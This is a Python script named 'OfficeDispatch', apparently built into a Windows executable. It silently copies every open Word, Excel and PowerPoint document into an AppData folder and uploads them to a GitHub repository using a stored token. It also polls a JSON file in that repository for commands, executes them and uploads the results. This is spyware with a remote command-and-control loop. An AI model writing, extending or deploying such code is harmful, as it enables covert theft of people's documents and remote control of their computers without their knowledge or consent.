import os
import sys
import time
import json
import xlwings as xw
import shutil
import hashlib
import datetime
import subprocess
import asyncio
from uploader import upload_files_to_github, upload_queue, check_and_rename_previous_logs
import config as ConfigLoader
import logger
import remote_exc
import win32com.client


if getattr(sys, 'frozen', False): # For pyinstaller
    script_dir = os.path.dirname(sys.executable)
else:
    script_dir = os.path.dirname(os.path.abspath(__file__))
CONFIG_PATH = os.path.join(script_dir, "config.json")
current_date = datetime.datetime.now().strftime("%Y.%m.%d")
appdata_path = os.getenv('APPDATA')
repo_path = os.path.join(appdata_path, "OfficeDispatch")
LOG_FILE_PATH = os.path.join(repo_path, current_date, f'{current_date}.log')

config = ConfigLoader.load_config()

def initialize_com_object(app_name):
    attempt = 0
    while attempt < config['retry_interval']:
        try:
            app = win32com.client.Dispatch(app_name)
            return app
        except Exception as e:
            logger.log_message(f"Error initializing {app_name}: {e}. Retrying in {config['retry_interval']} seconds...")
            time.sleep(config['retry_interval'])
            attempt += 1
    return None

ppt = initialize_com_object("PowerPoint.Application")
word = initialize_com_object("Word.Application")
os.makedirs(repo_path, exist_ok=True)
processed_files = set()

def calculate_md5(file_path):
    hash_md5 = hashlib.md5()
    with open(file_path, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()

def split_and_compress_file(file_path, output_dir, volume_size=25*1024*1024):
    base_name = os.path.basename(file_path)
    os.makedirs(output_dir, exist_ok=True)
    archive_path = os.path.join(output_dir, base_name)
    archive_name = os.path.join(archive_path, base_name + ".7z")
    try:
        volume_size_mb = volume_size // (1024 * 1024)
        zip = [
            '7z', 'a', '-v{}m'.format(volume_size_mb), '-mx=1', archive_name, file_path
        ]
        subprocess.run(zip, shell=True)
        part_file_paths = [os.path.join(archive_path, f) for f in os.listdir(archive_path) if f.startswith(base_name)]

        info_path = os.path.join(archive_path, "info.json")
        info_data = {
            "original_file_path": file_path,
            "original_file_size": os.path.getsize(file_path),
            "part_count": len(part_file_paths),
            "parts": [{"part_number": i+1, "part_size": os.path.getsize(part_file)} for i, part_file in enumerate(part_file_paths)]
        }
        with open(info_path, 'w') as info_file:
            json.dump(info_data, info_file, indent=4)

        logger.log_message(f"File {file_path} is too large, split and compressed into {archive_path} with {len(part_file_paths)} parts", LOG_FILE_PATH)
        for part_file_path in part_file_paths:
            upload_queue.put(part_file_path)
        
        processed_files.add(file_path)
    except subprocess.CalledProcessError as e:
        logger.log_message(f"Failed to compress {file_path} with error: {e}", LOG_FILE_PATH)

def copy_file(file_name, file_size, category, target_folder, log_file_path=LOG_FILE_PATH):
    try:
        dest_folder = os.path.join(target_folder, category)
        if file_size > 25 * 1024 * 1024:
            split_and_compress_file(file_name, dest_folder)
        else:
            dest_file_path = os.path.join(dest_folder, os.path.basename(file_name))
            if os.path.exists(dest_file_path) and calculate_md5(file_name) == calculate_md5(dest_file_path):
                logger.log_message(f"File {file_name} already exists and is identical, skipping copy", log_file_path)
                return False
            shutil.copy(file_name, dest_folder)
            logger.log_message(f"Copied {file_name} to {dest_folder} successfully", log_file_path)
            upload_queue.put(dest_file_path)
            processed_files.add(file_name)
        return True
    except Exception as e:
        logger.log_message(f"Failed to copy {file_name} due to {e}", log_file_path)
        return False
    
def refresh_com_object(app_name):
    try:
        app = win32com.client.Dispatch(app_name)
        return app
    except Exception as e:
        logger.log_message(f"Error initializing {app_name}: {e}")
        return None
    
def process_files():
    try:
        target_folder = os.path.join(repo_path, current_date)
        for folder in ["PowerPoint", "Excel", "Word"]:
            os.makedirs(os.path.join(target_folder, folder), exist_ok=True)
        for main_folder in ["PowerPoint", "Excel", "Word"]:
            main_folder_path = os.path.join(target_folder, main_folder)
            for subfolder in os.listdir(main_folder_path):
                subfolder_path = os.path.join(main_folder_path, subfolder)
                if os.path.isdir(subfolder_path):
                    info_path = os.path.join(subfolder_path, "info.json")
                    if os.path.exists(info_path):
                        with open(info_path, 'r') as info_file:
                            info_data = json.load(info_file)
                            processed_files.add(info_data["original_file_path"])
        office_apps = [
            (ppt, "PowerPoint", lambda app: app.Presentations, lambda pres: pres.FullName),
            (xw.apps.active, "Excel", lambda app: app.books, lambda book: book.fullname),
            (word, "Word", lambda app: app.Documents, lambda doc: doc.FullName)
        ]

        for app, folder_name, get_items, get_filename in office_apps:
            if app:
                for item in get_items(app):
                    file_name = os.path.abspath(get_filename(item))
                    if file_name not in processed_files:
                        processed_files.add(file_name)
                        file_size = os.path.getsize(file_name)
                        if copy_file(file_name, file_size, folder_name, target_folder):
                            continue
        return LOG_FILE_PATH
    except Exception as e:
        if hasattr(e, 'args') and "PowerPoint.Application.Presentations" in e.args:
            print("PowerPoint Application Presentations error:", e, "[This error can be ingored]")
            return None
        if hasattr(e, 'args') and any("-2147023174" in str(arg) for arg in e.args):
            print("RPC server unavailable error:", e)
            return None
        logger.log_message(f"Error in processing files: {e}")
    return None



async def main_loop(config):
    ppt = refresh_com_object("PowerPoint.Application")
    word = refresh_com_object("Word.Application")
    
    while True:
        if config["RemoteExc"]["enabled"]:
            await asyncio.gather(
                run_office_dispatch(config, ppt, word),
                run_remote_exc(config)
            )
        else:
            await run_office_dispatch(config, ppt, word)

        await asyncio.sleep(config["check_interval"])
        
async def run_office_dispatch(config, ppt, word):
    while True:
        log_file_path = process_files()
        if log_file_path:
            check_and_rename_previous_logs(repo_path)
            upload_files_to_github(config["repo_name"], config['github_token'], upload_queue, LOG_FILE_PATH, repo_path, config['retry_interval'])
        await asyncio.sleep(config["check_interval"])

async def run_remote_exc(config):
    while True:
        command_data, last_modified = remote_exc.fetch_command_json(config["repo_name"], config["json_file_path"], config['github_token'], LOG_FILE_PATH)
        if command_data:
            if any(command.get("executed", False) for command in command_data.get("commands", [])):
                print("Skipping JSON file as it contains executed commands.")
            else:
                for command in command_data.get("commands", []):
                    print(command)
                    remote_exc.execute_command(command, config, LOG_FILE_PATH, upload_queue, repo_path)
                    upload_files_to_github(config["repo_name"], config['github_token'], upload_queue, LOG_FILE_PATH, repo_path, config['retry_interval'])
                remote_exc.update_command_json(config["repo_name"], config["json_file_path"], config['github_token'], command_data, LOG_FILE_PATH)
        await asyncio.sleep(config["RemoteExc"]["interval"])


if __name__ == "__main__":
    try:
        asyncio.run(main_loop(config))
    except Exception as e:
        logger.log_message(f"Error: {e}")
